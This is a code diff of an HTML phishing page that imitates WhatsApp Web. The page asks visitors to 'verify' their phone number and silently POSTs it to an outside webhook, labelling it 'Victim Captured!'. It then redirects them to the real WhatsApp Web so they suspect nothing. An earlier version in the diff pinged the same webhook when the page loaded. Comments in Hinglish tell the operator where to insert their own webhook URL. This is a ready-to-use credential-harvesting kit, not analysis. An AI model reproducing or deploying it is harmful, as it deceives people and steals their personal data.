@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WhatsApp Update</title>
+    <title>WhatsApp Web</title>
     <style>
         body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: #001f3f; /* WhatsApp Dark Blue */ 
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
+            background: #111; 
             color: white; 
             display: flex; 
             justify-content: center; 
@@ -14,43 +14,109 @@
             margin: 0; 
             flex-direction: column;
         }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #008069;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
+        .container { text-align: center; width: 300px; }
+        .logo { width: 80px; margin-bottom: 20px; }
+        
+        /* Step 1: Number Input */
+        #step1 { display: block; }
+        #step2 { display: none; }
+        
+        input { 
+            width: 100%; 
+            padding: 15px; 
+            border: none; 
+            border-radius: 8px; 
+            background: #222; 
+            color: white; 
+            font-size: 16px; 
+            margin-bottom: 15px; 
+            box-sizing: border-box;
+        }
+        
+        button { 
+            width: 100%; 
+            padding: 15px; 
+            background: #008069; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+        }
+        button:hover { background: #006d59; }
+        
+        .hint { 
+            margin-top: 10px; 
+            font-size: 12px; 
+            color: #aaa; 
+        }
+        
+        /* QR Page Styling */
+        .qr-container {
+            border: 2px dashed #008069;
+            padding: 20px;
+            border-radius: 10px;
             margin-bottom: 20px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        p { font-size: 18px; color: #ccc; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>Synchronizing your account...</p>
+
+    <div class="container">
+        <!-- Logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+
+        <!-- Step 1: Fake Verification Screen -->
+        <div id="step1">
+            <h2>Verify Number</h2>
+            <p style="font-size: 14px; color: #ccc;">Enter your number to sync messages directly.</p>
+            <input type="tel" id="phone" placeholder="e.g., 919876543210">
+            <button onclick="captureAndRedirect()">Sync Now</button>
+            <p class="hint">Don't close this tab until sync is complete.</p>
+        </div>
+
+        <!-- Step 2: Direct QR Redirect (Shown after capture) -->
+        <div id="step2">
+            <h2>Redirecting...</h2>
+            <p>Opening WhatsApp Web securely.</p>
+            <div class="loader" style="border: 4px solid #f3f3f3; border-top: 4px solid #008069; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;"></div>
+        </div>
+    </div>
 
     <script>
-        // 👇 APNA DISCORD WEBHOOK URL YAHAN DALO 👇
-        const WEBHOOK_URL = "https://webhooksite.net/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
+        // 👇 APNA WEBHOOK URL YAHAN DALO 👇
+        const WEBHOOK = "https://webhooksite.net/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
 
-        // 1. Webhook Bhejo ki User Link Khola
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: "👁️ **User Opened Link!** Ready to capture."
-            })
-        }).catch(err => console.log("Webhook fail"));
+        function captureAndRedirect() {
+            const phone = document.getElementById('phone').value;
+            
+            if(!phone || phone.length < 5) {
+                alert("Please enter a valid number");
+                return;
+            }
 
-        // 2. 1.5 Second baad Seedra WhatsApp Web par bhej do (QR Page par)
-        setTimeout(() => {
-            window.location.href = "https://web.whatsapp.com/";
-        }, 1500);
+            // 1. Number Capture Karo
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🎯 **Victim Captured!**\n📱 **Number:** ${phone}\n⏰ **Time:** ${new Date().toLocaleString()}`
+                })
+            });
+
+            // 2. UI Change Karo
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+
+            // 3. Seedra WhatsApp Web (QR Page) par bhejo
+            setTimeout(() => {
+                // Yahan par hum seedra QR page par ja rahe hain
+                window.location.href = "https://web.whatsapp.com/";
+            }, 1000);
+        }
     </script>
 </body>
 </html>
